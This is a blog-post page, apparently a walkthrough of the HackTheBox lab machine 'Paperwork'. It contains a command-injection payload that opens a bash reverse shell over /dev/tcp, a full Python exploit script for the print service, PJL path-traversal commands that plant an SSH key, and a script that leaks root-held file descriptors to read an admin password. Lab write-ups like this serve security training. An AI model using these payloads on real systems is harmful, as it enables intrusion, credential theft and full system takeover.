@@ -1,0 +1,598 @@
+<!DOCTYPE html><html lang="en-in"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HackTheBox Paperwork Walkthrough - h4ck3rfirst</title><meta name="robots" content="noindex,nofollow"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta property="og:title" content="HackTheBox Paperwork Walkthrough"><meta property="og:image" content="https://h4ck3rfirst.github.io/media/website/profile-2.png"><meta property="og:image:width" content="300"><meta property="og:image:height" content="300"><meta property="og:site_name" content="h4ck3rfirst"><meta property="og:description" content="Paperwork is an Easy-difficulty Linux machine on Hack The Box focusing on source code review, protocol abuse, and a multi-stage&amp;hellip;"><meta property="og:url" content="https://h4ck3rfirst.github.io/hackthebox-paperwork-walkthrough/"><meta property="og:type" content="article"><link rel="stylesheet" href="https://h4ck3rfirst.github.io/assets/css/style.css?v&#x3D;1caf1a6f5543014e342e13c53b1080b8"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://h4ck3rfirst.github.io/hackthebox-paperwork-walkthrough/"},"headline":"HackTheBox Paperwork Walkthrough","datePublished":"2026-07-13T22:17+05:30","dateModified":"2026-09-30T22:23+05:30","image":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300},"description":"Paperwork is an Easy-difficulty Linux machine on Hack The Box focusing on source code review, protocol abuse, and a multi-stage&hellip;","author":{"@type":"Person","name":"h4ck3rfirst","url":"https://h4ck3rfirst.github.io/authors/h4ck3rfirst/"},"publisher":{"@type":"Organization","name":"h4ck3rfirst","logo":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300}}}</script><noscript><style>img[loading] {
+                    opacity: 1;
+                }</style></noscript><style>@media (max-width: 600px) {
+    #publii-space-dust {
+        opacity: 0.85;
+    }
+}</style></head><body class="post-template"><div id="publii-space-dust" aria-hidden="true"><div id="publii-space-mouse-glow"></div></div><header class="top js-header"><a class="logo" href="https://h4ck3rfirst.github.io/"><img src="https://h4ck3rfirst.github.io/media/website/profile-2.png" alt="h4ck3rfirst" width="300" height="300"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://h4ck3rfirst.github.io/" target="_self" rel="https://h4ck3rfirst.github.io/">Home</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/" target="_self">CTF/Labs</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/" target="_self">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/windows/" target="_self">Windows</a></li><li><a href="https://h4ck3rfirst.github.io/tags/learning/" target="_self">Learning</a></li><li><a href="https://h4ck3rfirst.github.io/about-me/" target="_self">About me</a></li></ul></nav></header><main class="post"><article class="content"><div class="hero hero--noimage"><header class="hero__content"><div class="wrapper"><h1>HackTheBox Paperwork Walkthrough</h1><div class="feed__meta content__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2026-07-13T22:17" class="feed__date">July 13, 2026</time></div></div></header></div><div class="entry-wrapper content__entry"><p>Paperwork is an Easy-difficulty Linux machine on Hack The Box focusing on source code review, protocol abuse, and a multi-stage privilege escalation chain.</p><h3 id="nmap">Nmap</h3><pre><code>PORT     STATE SERVICE        VERSION
+22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http           nginx 1.28.0 (Ubuntu)
+|_http-server-header: nginx/1.28.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://paperwork.htb/
+1515/tcp open  ifor-protocol?
+| fingerprint-strings:
+|   TerminalServer, TerminalServerCookie:
+|_    Archive_Printer is ready and printing.
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port1515-TCP:V=7.99%I=7%D=7/13%Time=6A546D2C%P=x86_64-pc-linux-gnu%r(Te
+SF:rminalServerCookie,27,&quot;Archive_Printer\x20is\x20ready\x20and\x20printin
+SF:g\.\n&quot;)%r(TerminalServer,27,&quot;Archive_Printer\x20is\x20ready\x20and\x20p
+SF:rinting\.\n&quot;);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><ul><li><strong>Port 80 (HTTP)</strong>: A standard web server redirecting traffic to <code>http://paperwork.htb</code>.</li><li><strong>Port 22 (SSH)</strong>: A standard administrative login terminal interface.</li><li><strong>Port 1515 (TCP)</strong>: An unrecognized service returning a text banner: <code>Archive_Printer is ready and printing.</code></li></ul><h3 id="https_80">https_80</h3><ul><li>static main page</li><li>downlaod : /downlaod/archive –downlaod to ~/shared/hackthebox/paperwork/</li><li>flask application</li><li>no other functionaly</li></ul><p>By inspecting the application code file <code>server.py</code> running on Port 1515, a fatal flaw was found in how it logged printer tasks.</p><p>The application took incoming network text data, searched for lines starting with the letter <code>J</code>, and threw everything after it directly into a system command layout using Python’s <code>subprocess.Popen(..., shell=True)</code> function without checking for malicious inputs.</p><pre><code># Vulnerable Backend Pattern:
+subprocess.Popen(f&quot;echo &#39;Archive: {job_name}&#39; &gt;&gt; /tmp/archive.log&quot;, shell=True)
+</code></pre><p><strong>The Exploit</strong></p><p>If a normal job name is <code>Document</code>, the server runs <code>echo &#39;Archive: Document&#39;</code>.<br>However, by using a semicolon (<code>;</code>), we can tell the server’s command terminal to finish the <code>echo</code> instruction immediately and run a completely new command of our choice.</p><p>We supplied the target queue name <code>archive_intake</code> (discovered on the website interface) and sent a string designed to break out of the sentence structure and call a <strong>Reverse Shell</strong> back to our machine:</p><pre><code>tester&#39; ; bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.153/4444 0&gt;&amp;1&quot; #
+</code></pre><pre><code class="language-gpt_give_me_script_to_pwn">#!/usr/bin/env python3
+import socket
+import time
+
+# Update with target details
+TARGET = &quot;machine_ip&quot;
+PORT = 1515
+
+# Update with your listener details
+LHOST = &quot;your tuno ip&quot;
+LPORT = 4444
+
+# Payload clean-up (removed extra nested quote escapes that break shell compilation)
+command = f&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/{LHOST}/{LPORT} 0&gt;&amp;1&#39;&quot;
+job_name = f&quot;test&#39; ; {command} #&quot;
+
+# The data block content sent to the daemon
+control_file = f&quot;Hlocalhost\nPtester\nJ{job_name}\n&quot;.encode()
+
+with socket.create_connection((TARGET, PORT), timeout=5) as sock:
+    # Fix 1: Send the mandatory target queue name
+    print(&quot;[*] Initialising protocol state machine with queue name...&quot;)
+    sock.sendall(b&quot;\x02archive_intake\n&quot;)
+    time.sleep(0.3)
+
+    # Calculate precise length of the payload block
+    payload_len = len(control_file)
+    header = b&quot;\x02&quot; + str(payload_len).encode() + b&quot; cfA001localhost\n&quot;
+
+    print(f&quot;[*] Sending transmission header (Size: {payload_len})...&quot;)
+    sock.sendall(header)
+
+    # Catch standard acknowledgement from the daemon stage
+    ack = sock.recv(1)
+    print(f&quot;[+] Header ACK status: {ack!r}&quot;)
+
+    # Fix 2: Send the control file content cleanly. The server code handles loop termination.
+    print(&quot;[*] Uploading malicious print job payload...&quot;)
+    sock.sendall(control_file)
+
+    # Send a separate single null byte to fulfill the secondary subcommand loop break
+    time.sleep(0.2)
+    sock.sendall(b&quot;\x00&quot;)
+
+    try:
+        final_ack = sock.recv(2)
+        print(f&quot;[+] Final response captured: {final_ack!r}&quot;)
+    except socket.timeout:
+        print(&quot;[!] Connection timed out cleanly (Payload likely executing!)&quot;)
+        pass
+</code></pre><p><strong>The Result:</strong> The server executed our hidden payload and connected back to our netcat listener, granting us our first interactive session on the machine as the <strong><code>lp</code> user</strong></p><h3 id="initial-foothold">Initial foothold</h3><h4 id="rev_as_ip">rev_as_ip</h4><pre><code>└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+use connect to [10.10.16.153] from (UNKNOWN) [10.129.11.196] 56246
+bash: cannot set terminal process group (983): Inappropriate ioctl for device
+bash: no job control in this shell
+lp@paperwork:/opt/LPDServer$ ls
+</code></pre><pre><code>lp@paperwork:/home$ ss -tlup
+ss -tlup
+Netid State  Recv-Q Send-Q Local Address:Port   Peer Address:PortProcess
+udp   UNCONN 0      0         127.0.0.54:domain      0.0.0.0:*
+udp   UNCONN 0      0      127.0.0.53%lo:domain      0.0.0.0:*
+udp   UNCONN 0      0            0.0.0.0:bootpc      0.0.0.0:*
+udp   UNCONN 0      0          127.0.0.1:323         0.0.0.0:*
+udp   UNCONN 0      0              [::1]:323            [::]:*
+tcp   LISTEN 0      511          0.0.0.0:http        0.0.0.0:*
+tcp   LISTEN 0      4096         0.0.0.0:ssh         0.0.0.0:*
+tcp   LISTEN 0      4096      127.0.0.54:domain      0.0.0.0:*
+tcp   LISTEN 0      4096   127.0.0.53%lo:domain      0.0.0.0:*
+tcp   LISTEN 0      128        127.0.0.1:1337        0.0.0.0:*
+tcp   LISTEN 0      100          0.0.0.0:1515        0.0.0.0:*    users:((&quot;python3&quot;,pid=983,fd=3))
+tcp   LISTEN 0      100        127.0.0.1:9100        0.0.0.0:*
+tcp   LISTEN 0      4096            [::]:ssh            [::]:*
+</code></pre><ul><li>port forwarded with chisel</li><li>1337 = is same as http_80</li><li>we noticed a script named <code>jetdirect.py</code> handling connections on an internal communication pipeline at <strong>Port 9100</strong>.</li></ul><p>The script was meant to read and write files within a restricted folder structure using two commands: <code>@PJL FSUPLOAD</code> (to read files) and <code>@PJL FSDOWNLOAD</code> (to write files). However, the program didn’t check if paths contained relative directory jump patterns (<code>../</code>)</p><p><strong>The Exploit</strong> Because <code>os.path.normpath</code> resolves relative paths, sending a request with multiple <code>../</code> patterns allowed us to step entirely out of the target folder jail.</p><ol><li><strong>Reading the Flag</strong>: We read the restricted user file to claim our progression marker:</li></ol><pre><code>@PJL FSUPLOAD NAME=&quot;0:../user.txt&quot;
+</code></pre><ol start="2"><li><strong>Injecting an Access Key</strong>: We generated a custom SSH keypair on our attack machine and used the file download capability to forcibly write our public key directly into the archivist’s automated authorization folder:</li></ol><pre><code>@PJL FSDOWNLOAD NAME=&quot;0:../../../../../../../home/archivist/.ssh/authorized_keys&quot;
+</code></pre><p><strong>The Result:</strong> With our public key inside the profile folder, we cleanly logged in via standard SSH to become the <strong><code>archivist</code> user</strong>.</p><h4 id="ssh-as-archivist">Ssh as archivist</h4><pre><code>└─$ ssh -i ~/id_archivist archivist@10.129.11.212
+
+Last login: Thu May 28 15:22:41 UTC 2026 from 10.10.14.3 on ssh
+Welcome to Ubuntu 25.10 (GNU/Linux 6.17.0-40-generic x86_64)
+
+ * Documentation:  https://docs.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+Last login: Mon Jul 13 06:15:11 2026 from 10.10.16.153
+archivist@paperwork:~$ ls
+printer  user.txt
+</code></pre><h3 id="privilege-escalation">Privilege Escalation</h3><p>Once inside as <code>archivist</code>, we discovered a script running automatically under absolute administrative permissions (<code>root</code>) named <code>/usr/bin/paperwork-daemon</code>. This program monitored a background socket file at <code>/run/paperwork/mgmt.sock</code>.</p><p>The daemon was designed to inspect security logs. If it saw suspicious keywords like <code>FSUPLOAD</code>, it triggered a lockdown defense block. Ironically, the lockdown function contained a major design flaw: it opened the highly restricted password file <code>/etc/paperwork/admin_pins.conf</code> as root, and then <strong>passed the live file communication link (File Descriptor) straight over the open socket connection to the client</strong> using <code>SCM_RIGHTS</code>.</p><pre><code># The flaw passing root file rights down to any connecting client:
+evidence_bundle = array.array(&quot;i&quot;, [log_fd, admin_fd])
+conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
+</code></pre><pre><code class="language-save">import socket
+import os
+import array
+
+socket_path = &quot;/run/paperwork/mgmt.sock&quot;
+
+# Connect to the unix socket
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect(socket_path)
+
+# Allocate buffer space for standard message data and ancillary control messages (fds)
+msg_capacity = 1024
+anc_capacity = socket.CMSG_SPACE(array.array(&#39;i&#39;).itemsize * 2)
+
+# Receive message using recvmsg
+msg, ancdata, flags, addr = s.recvmsg(msg_capacity, anc_capacity)
+print(f&quot;[*] Received Message: {msg.decode(errors=&#39;ignore&#39;).strip()}&quot;)
+
+for cmsg_level, cmsg_type, cmsg_data in ancdata:
+    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
+        # Reconstruct the file descriptors from the raw byte streams
+        fds = array.array(&#39;i&#39;)
+        fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])
+
+        print(f&quot;[+] Leaked File Descriptors: {list(fds)}&quot;)
+
+        # The second descriptor (index 1) corresponds to admin_fd
+        if len(fds) &gt;= 2:
+            admin_fd = fds[1]
+            print(&quot;[*] Attempting to read content from the leaked admin_fd...&quot;)
+
+            # Use os.lseek to reset the read offset pointer to 0 just in case
+            os.lseek(admin_fd, 0, os.SEEK_SET)
+            secret_data = os.read(admin_fd, 1024).decode(errors=&#39;ignore&#39;).strip()
+
+            print(&quot;\n================= RECOVERED SECRET =================&quot;)
+            print(secret_data)
+            print(&quot;====================================================\n&quot;)
+s.close()
+</code></pre><p>then</p><pre><code>echo &quot;FSUPLOAD&quot; &gt;&gt; /home/archivist/printer/logs/commands.log
+
+python3 exploit_root.py
+[*] Received Message: ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
+[+] Leaked File Descriptors: [4, 5]
+[*] Attempting to read content from the leaked admin_fd...
+
+================= RECOVERED SECRET =================
+ADMIN_PASSWORD=App************ar22
+====================================================
+</code></pre><p><strong>The Exploit</strong></p><ol><li>We artificially triggered the security alarm by writing the word <code>FSUPLOAD</code> into our logs.</li><li>We ran a tiny client script to talk to the socket file.</li><li>The daemon panicked, triggered the lockdown code, and inadvertently handed over the live file descriptors (<code>[4, 5]</code>).</li><li>Our client script read directly from the leaked descriptor channel, retrieving the contents of the password file without having root permissions.</li></ol><p><strong>The Result:</strong> The plain-text administrative credential was safely recovered:</p><pre><code>ADMIN_PASSWORD=App****************ar22
+</code></pre><p>Using this password with the standard <code>su root</code> command grants <strong>complete root control</strong> over the entire server environment.</p><pre><code>archivist@paperwork:/tmp$ su root
+Password:
+root@paperwork:/tmp# id
+uid=0(root) gid=0(root) groups=0(root)
+root@paperwork:/tmp#
+</code></pre></div><footer class="content__footer"><div class="entry-wrapper"><p class="content__updated">This article was updated on September 30, 2026</p><div class="content__actions"><ul class="content__tag"><li><a href="https://h4ck3rfirst.github.io/tags/code-injection/">code injection</a></li><li><a href="https://h4ck3rfirst.github.io/tags/easy/">Easy</a></li><li><a href="https://h4ck3rfirst.github.io/tags/hackthebox/">hackthebox</a></li></ul><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-paperwork-walkthrough%2F" class="js-share linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=HackTheBox%20Paperwork%20Walkthrough&amp;url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-paperwork-walkthrough%2F" class="js-share buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=HackTheBox%20Paperwork%20Walkthrough https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-paperwork-walkthrough%2F" class="js-share whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" rel="author">h4ck3rfirst</a></h3></div></div></div></footer></article><div class="content__related related"><div class="wrapper"><h2 class="h4 related__title">You should also read:</h2><article class="feed__item feed__item--centered"><figure class="feed__image related__image"><img src="https://h4ck3rfirst.github.io/media/posts/27/outbound.jpg" srcset="https://h4ck3rfirst.github.io/media/posts/27/responsive/outbound-xs.jpg 640w, https://h4ck3rfirst.github.io/media/posts/27/responsive/outbound-sm.jpg 768w, https://h4ck3rfirst.github.io/media/posts/27/responsive/outbound-md.jpg 1024w" sizes="(min-width: 600px) calc(4.38vw + 143px), 87.86vw" loading="lazy" height="300" width="300" alt=""></figure><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-07-26T19:40" class="feed__date">July 26, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/hackthebox-outbound-walkthrough/">HackTheBox Outbound Walkthrough</a></h3></header><p>Complete walkthrough of the HackTheBox Pentest Lab machine Outbound hackthebox Difficulty: Easy OS: Linux Objective: Capture user.txt and root.txt Focus&hellip;</p></div></article><article class="feed__item feed__item--centered"><figure class="feed__image related__image"><img src="https://h4ck3rfirst.github.io/media/posts/12/soulmate.jpg" srcset="https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-xs.jpg 640w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-sm.jpg 768w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-md.jpg 1024w" sizes="(min-width: 600px) calc(4.38vw + 143px), 87.86vw" loading="lazy" height="300" width="300" alt=""></figure><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-09-11T23:23" class="feed__date">September 11, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/hackthebox-soulmate-walkthrough/">HackTheBox Soulmate Walkthrough</a></h3></header><p>Complete walkthrough of the HackTheBox Pentest Lab machine ‘Soulmate hackthebox HackTheBox — Soulmate Writeup Difficulty: Easy OS: Linux IP: 10.10.11.85&hellip;</p></div></article><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-09-21T18:18" class="feed__date">September 21, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/hackthebox-expressway-walkthrough/">HackTheBox Expressway Walkthrough</a></h3></header><p>Complete walkthrough of the HackTheBox Pentest Lab machine Expressway ┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway] └─$ rustscan -a 10.10.11.87 .----. .-. .-. .----..---. .----. .---.</p></div></article></div></div></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><h6>Documenting the world of bug bounties, pentesting, and security engineering one lab at a time.</h6><p class="align-center">© 2026 h4ck3rfirst . Built with 😊.</p></div><button id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://h4ck3rfirst.github.io/assets/js/scripts.min.js?v&#x3D;dafec4f87fead6718cb125f0b0fc8441"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
+        for (var i = 0; i < images.length; i++) {
+            if (images[i].complete) {
+                images[i].classList.add('is-loaded');
+            } else {
+                images[i].addEventListener('load', function () {
+                    this.classList.add('is-loaded');
+                }, false);
+            }
+        }</script><script>(function () {
+    "use strict";
+
+    const space = document.getElementById("publii-space-dust");
+
+    if (!space) return;
+
+    /* ================================
+       SETTINGS
+       ================================ */
+
+    const STAR_COUNT = 1200;
+
+    /*
+     * Approximately 2 cm on a typical desktop display.
+     * CSS pixels are not physically exact across monitors,
+     * so this is an approximate interaction radius.
+     */
+    const MOUSE_RADIUS = 75;
+
+    /* How fast the dust moves */
+    const MIN_SPEED = 0.99;
+    const MAX_SPEED = 2.99;
+
+    /* How often stars twinkle */
+    const MIN_TWINKLE = 0.9;
+    const MAX_TWINKLE = 2.8;
+
+    /* ================================
+       VARIABLES
+       ================================ */
+
+    const stars = [];
+    let mouseX = -9999;
+    let mouseY = -9999;
+    let animationFrame;
+
+    const glow = document.getElementById(
+        "publii-space-mouse-glow"
+    );
+
+    /* ================================
+       RANDOM HELPERS
+       ================================ */
+
+    function random(min, max) {
+        return Math.random() * (max - min) + min;
+    }
+
+    function clamp(value, min, max) {
+        return Math.max(min, Math.min(max, value));
+    }
+
+    /* ================================
+       CREATE STARS
+       ================================ */
+
+    for (let i = 0; i < STAR_COUNT; i++) {
+
+        const star = document.createElement("span");
+
+        star.className = "publii-star";
+
+        /*
+         * Most particles are tiny.
+         * A few are slightly larger.
+         */
+        const sizeChance = Math.random();
+
+        let size;
+
+        if (sizeChance > 0.992) {
+            size = random(3.0, 4.5);
+            star.classList.add("big");
+        } else if (sizeChance > 0.96) {
+            size = random(1.8, 3.2);
+        } else if (sizeChance > 0.82) {
+          // Normal stars
+    	size = random(1.0, 1.8);
+		} else {
+    	// Tiny space dust
+    	size = random(0.4, 1.1);
+		}
+
+        star.style.width = size + "px";
+        star.style.height = size + "px";
+
+        const x = Math.random() * window.innerWidth;
+        const y = Math.random() * window.innerHeight;
+
+        star.style.left = x + "px";
+        star.style.top = y + "px";
+
+        /*
+         * Each particle gets its own direction
+         * and speed so the background feels like dust.
+         */
+        const angle = random(0, Math.PI * 2);
+
+        const speed = random(
+            MIN_SPEED,
+            MAX_SPEED
+        );
+
+        /*
+         * Twinkle timing
+         */
+        const twinkleDuration = random(
+            MIN_TWINKLE,
+            MAX_TWINKLE
+        );
+
+        const twinkleDelay = random(
+            0,
+            MAX_TWINKLE
+        );
+
+        star.style.animation =
+            "publiiStarTwinkle " +
+            twinkleDuration +
+            "s ease-in-out " +
+            twinkleDelay +
+            "s infinite";
+
+        /*
+         * Store particle information.
+         */
+        stars.push({
+            element: star,
+
+            x: x,
+            y: y,
+
+            vx: Math.cos(angle) * speed,
+            vy: Math.sin(angle) * speed,
+
+            baseOpacity: random(0.25, 0.9),
+
+            size: size
+        });
+
+        space.appendChild(star);
+    }
+
+    /* ================================
+       ADD TWINKLE ANIMATION
+       ================================ */
+
+    const style = document.createElement("style");
+
+    style.textContent = `
+        @keyframes publiiStarTwinkle {
+            0%, 100% {
+                opacity: 0.08;
+            }
+
+            25% {
+                opacity: 0.35;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            75% {
+                opacity: 0.4;
+            }
+        }
+    `;
+
+    document.head.appendChild(style);
+
+    /* ================================
+       MOUSE
+       ================================ */
+
+    window.addEventListener(
+        "mousemove",
+        function (event) {
+
+            mouseX = event.clientX;
+            mouseY = event.clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /*
+     * Remove mouse interaction when
+     * pointer leaves the browser window.
+     */
+    document.addEventListener(
+        "mouseleave",
+        function () {
+            mouseX = -9999;
+            mouseY = -9999;
+        }
+    );
+
+    /* ================================
+       TOUCH
+       ================================ */
+
+    window.addEventListener(
+        "touchmove",
+        function (event) {
+
+            if (!event.touches.length) return;
+
+            mouseX = event.touches[0].clientX;
+            mouseY = event.touches[0].clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /* ================================
+       ANIMATION
+       ================================ */
+
+    function animate() {
+
+        const width = window.innerWidth;
+        const height = window.innerHeight;
+
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            /*
+             * Move dust
+             */
+            star.x += star.vx;
+            star.y += star.vy;
+
+            /*
+             * Wrap around screen edges
+             */
+            if (star.x < -10) {
+                star.x = width + 10;
+            }
+
+            if (star.x > width + 10) {
+                star.x = -10;
+            }
+
+            if (star.y < -10) {
+                star.y = height + 10;
+            }
+
+            if (star.y > height + 10) {
+                star.y = -10;
+            }
+
+            /*
+             * Move particle
+             */
+            star.element.style.transform =
+                "translate3d(" +
+                star.x +
+                "px," +
+                star.y +
+                "px,0)";
+        }
+
+        animationFrame = requestAnimationFrame(animate);
+    }
+
+    animate();
+
+    /* ================================
+       MOUSE CONNECTIONS
+       ================================ */
+
+    /*
+     * Instead of permanently creating 800 lines,
+     * we create them only when needed.
+     */
+
+    let lastLineUpdate = 0;
+
+    function updateConnections(timestamp) {
+
+        /*
+         * Limit line calculations to about 30fps.
+         * This keeps 800 particles smooth.
+         */
+        if (timestamp - lastLineUpdate < 33) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        lastLineUpdate = timestamp;
+
+        /*
+         * Delete old connection lines.
+         */
+        const oldLines =
+            space.querySelectorAll(
+                ".publii-star-line"
+            );
+
+        oldLines.forEach(function (line) {
+            line.remove();
+        });
+
+        /*
+         * No mouse = no connections.
+         */
+        if (mouseX < 0 || mouseY < 0) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        /*
+         * Find stars close to mouse.
+         */
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            const dx = star.x - mouseX;
+            const dy = star.y - mouseY;
+
+            const distance =
+                Math.sqrt(dx * dx + dy * dy);
+
+            if (distance <= MOUSE_RADIUS) {
+
+                /*
+                 * Only connect fairly close stars
+                 * to the mouse.
+                 */
+                const line =
+                    document.createElement("span");
+
+                line.className =
+                    "publii-star-line";
+
+                const angle =
+                    Math.atan2(
+                        star.y - mouseY,
+                        star.x - mouseX
+                    ) * 180 / Math.PI;
+
+                line.style.left =
+                    mouseX + "px";
+
+                line.style.top =
+                    mouseY + "px";
+
+                line.style.width =
+                    distance + "px";
+
+                line.style.transform =
+                    "rotate(" + angle + "deg)";
+
+                /*
+                 * Closer = brighter.
+                 */
+                const opacity =
+                    1 - distance / MOUSE_RADIUS;
+
+                line.style.opacity =
+                    (opacity * 0.7).toFixed(2);
+
+                space.appendChild(line);
+            }
+        }
+
+        requestAnimationFrame(updateConnections);
+    }
+
+    requestAnimationFrame(updateConnections);
+
+    /* ================================
+       RESIZE
+       ================================ */
+
+    window.addEventListener(
+        "resize",
+        function () {
+
+            /*
+             * Keep stars inside the new viewport.
+             */
+            const width = window.innerWidth;
+            const height = window.innerHeight;
+
+            stars.forEach(function (star) {
+
+                if (star.x > width) {
+                    star.x = Math.random() * width;
+                }
+
+                if (star.y > height) {
+                    star.y = Math.random() * height;
+                }
+            });
+        }
+    );
+
+    /* ================================
+       CLEANUP
+       ================================ */
+
+    window.addEventListener(
+        "pagehide",
+        function () {
+            cancelAnimationFrame(animationFrame);
+        }
+    );
+
+})();</script></body></html>
